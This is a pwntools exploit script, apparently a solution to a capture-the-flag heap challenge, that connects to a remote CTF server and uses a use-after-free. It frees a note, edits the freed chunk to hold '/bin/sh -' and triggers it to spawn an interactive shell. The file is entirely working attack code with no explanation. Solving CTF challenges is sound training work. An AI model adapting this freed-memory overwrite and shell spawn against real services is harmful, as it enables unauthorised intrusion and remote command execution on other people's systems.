from pwn import *

#exe = context.binary = ELF('heahoz')
def add(idx,pay):
    io.sendlineafter(b':',str(1).encode())
    io.sendlineafter(b':',str(idx).encode())
    io.sendafter(b':',pay)
    return
def delete(idx):
    io.sendlineafter(b':',str(2).encode())
    io.sendlineafter(b':',str(idx).encode())
    return
def edit(idx,pay):
    io.sendlineafter(b':',str(4).encode())
    io.sendlineafter(b':',str(idx).encode())
    io.sendafter(b':',pay)
    return
def ahaha(idx):
    io.sendlineafter(b':',str(5).encode())
    io.sendlineafter(b':',str(idx).encode())
    return

#io = process(exe.path)
io = remote('pwn-1.mephictf.ru' ,8690)
add(0,b'hehehe')

add(1,b'echo Mua-ha-ha')

ahaha(1)

delete(0)

edit(0,b'/bin/sh -\x00')

ahaha(0)

io.interactive()

